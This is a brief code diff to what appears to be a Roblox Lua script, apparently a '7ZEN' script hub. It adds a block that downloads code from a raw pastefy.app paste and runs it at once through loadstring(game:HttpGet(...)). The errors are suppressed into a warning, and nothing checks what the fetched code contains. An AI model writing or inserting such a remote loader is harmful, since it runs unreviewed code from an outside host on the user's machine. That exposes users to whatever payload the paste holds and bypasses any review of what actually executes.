@@ -2283,3 +2283,15 @@ task.spawn(function()
         warn("7ZEN external script failed:", err)
     end
 end)
+
+task.spawn(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet(
+            "https://pastefy.app/rMFR66T5/raw"
+        ))()
+     end)
+
+   if not success then
+      warn("7ZEN external script failed:", err)
+    end
+end)
